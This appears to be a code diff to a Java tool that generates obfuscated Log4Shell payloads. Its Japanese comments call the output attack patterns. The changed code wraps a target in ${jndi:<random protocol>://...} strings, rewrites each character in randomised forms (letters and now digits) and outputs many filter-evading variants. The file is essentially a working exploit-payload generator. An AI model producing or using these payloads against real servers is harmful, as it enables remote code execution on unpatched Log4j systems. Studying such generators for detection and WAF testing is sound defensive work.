@@ -14,7 +14,7 @@ public class Obfuscator {
      * 各攻撃パターンの最初につける文字列
      */
     static final String first = "${";
-    static final String jndi = "jndi://";
+    static final String jndi = "jndi:";
     static final String last = "}";
     /**
      * 攻撃パターンで使用するプロトコル
@@ -23,10 +23,16 @@ public class Obfuscator {
 
     static int repeat_limit = 20;
 
+    static String getProtocol() {
+        int index = protocols.length;
+        return protocols[(int)(Math.random() * (double)index - 0.5)] + "://";
+    }
+
     static ArrayList<String> Obfuscate(ArrayList<String> obfuscations, String target, int num, boolean mixed) {
-        target = jndi + target;
         ArrayList<String> output = new ArrayList<>();
+        target = jndi + "%" + target;
         if (mixed) {
+            target = CharMatcher.is('%').replaceFrom(target, getProtocol());
             for (int i = 0; i < num; i++) {
                 StringBuilder generated = new StringBuilder();
                 for (char ch : target.toCharArray()) {
@@ -37,8 +43,9 @@ public class Obfuscator {
         } else {
             for (String obfuscation : obfuscations) {
                 for (int i = 0; i < num; i++) {
+                    String target_new = CharMatcher.is('%').replaceFrom(target, getProtocol());
                     StringBuilder generated = new StringBuilder();
-                    for (char ch : target.toCharArray()) {
+                    for (char ch : target_new.toCharArray()) {
                         generated.append(ObfuscateByChar(ch, obfuscation));
                     }
                     output.add(first + generated + last);
@@ -49,17 +56,18 @@ public class Obfuscator {
     }
 
     static String ObfuscateByChar(char ch, String method) {
-        boolean upper = false;
-        boolean lower = false;
-        int more_than = -1;
+        boolean upper;
+        boolean lower;
+        boolean digit;
+        int more_than;
         ArrayList<Character> others = new ArrayList<>();
-        Pattern pattern = Pattern.compile("<.{1,3}>[+*]");
+        Pattern pattern = Pattern.compile("<[^>.]+>[+*]");
         Matcher matcher = pattern.matcher(method);
-        String tmp = "";
 
         while (matcher.find()) {
             upper = false;
             lower = false;
+            digit = false;
             more_than = -1;
             others.clear();
 
@@ -68,6 +76,9 @@ public class Obfuscator {
             }
             if (matcher.group().contains("a")) {
                 lower = true;
+            }
+            if (matcher.group().contains("0")) {
+                digit = true;
             }
             if (matcher.group().charAt(matcher.group().length() - 1) == '+') {
                 more_than = 1;
@@ -82,19 +93,13 @@ public class Obfuscator {
                     others.add(element);
                 }
             }
-            String remaining = method.replaceFirst("<.{1,3}>[+*]", "%");
-            tmp = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, more_than, others));
+            String remaining = method.replaceFirst("<[^>.]+>[+*]", "%");
+            method = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, digit, more_than, others));
         }
-        if (!tmp.isEmpty()) {
-            String remaining = tmp.replaceFirst("<.{1,3}>[+*]", "%");
-            String tmp2 = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, more_than, others));
-            return CharMatcher.is('#').replaceFrom(tmp2, ch);
-        } else {
-            return CharMatcher.is('#').replaceFrom(method, ch);
-        }
+        return CharMatcher.is('#').replaceFrom(method, ch);
     }
 
-    static String Generate(boolean upper, boolean lower, int more_than, ArrayList<Character> others) {
+    static String Generate(boolean upper, boolean lower, boolean digit, int more_than, ArrayList<Character> others) {
         StringBuilder sb = new StringBuilder();
         ArrayList<Character> candidates = new ArrayList<>();
         if (upper) {
@@ -105,6 +110,11 @@ public class Obfuscator {
         if (lower) {
             for (int i = 0; i < 26; i++) {
                 candidates.add((char) ('a' + i));
+            }
+        }
+        if (digit) {
+            for (int i = 0; i < 10; i++) {
+                candidates.add((char) ('0' + i));
             }
         }
         if (!others.isEmpty()) {
